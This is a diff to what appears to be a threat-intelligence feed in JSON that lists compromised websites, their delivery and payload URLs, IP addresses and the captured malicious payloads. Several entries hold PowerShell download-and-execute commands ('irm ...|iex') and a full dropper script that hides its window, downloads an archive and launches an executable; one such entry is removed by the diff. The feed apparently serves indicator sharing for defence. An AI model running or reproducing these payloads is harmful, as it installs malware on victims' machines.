@@ -1,5 +1,68 @@
 [
   {
+    "UrlDomain": "riskiriswandi.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.133"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/66a3105c05a5b069",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/66a3105c05a5b069'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/66a3105c05a5b069"
+    ],
+    "ReportId": "cmwx071yw0c8v0omlp9z99b26",
+    "ScannedAt": "2026-11-26T03:39:17.631000+00:00"
+  },
+  {
+    "UrlDomain": "sileajans.com.tr",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzyajr0bxx0omlfwd0algn",
+    "ScannedAt": "2026-11-26T03:32:28.831000+00:00"
+  },
+  {
+    "UrlDomain": "salihlievdenevenakliye.com.tr",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.69.207"
+    ],
+    "Related": [
+      {
+        "Value": "friendsoftorreabbey.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzxhdm0bx10omlwpl054pt",
+    "ScannedAt": "2026-11-26T03:31:51.050000+00:00"
+  },
+  {
     "UrlDomain": "rowantreetheatrecompany.co.uk",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -1250,25 +1313,5 @@
     ],
     "ReportId": "cmwvnxzc10fac0nmlrhg9rp82",
     "ScannedAt": "2026-11-25T05:08:32.722000+00:00"
-  },
-  {
-    "UrlDomain": "georgeweissmd.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "72.167.209.94"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
-    ],
-    "ReportId": "cmwvkqpwc0f2d0nmlhlwvocin",
-    "ScannedAt": "2026-11-25T03:38:55.024000+00:00"
   }
 ]
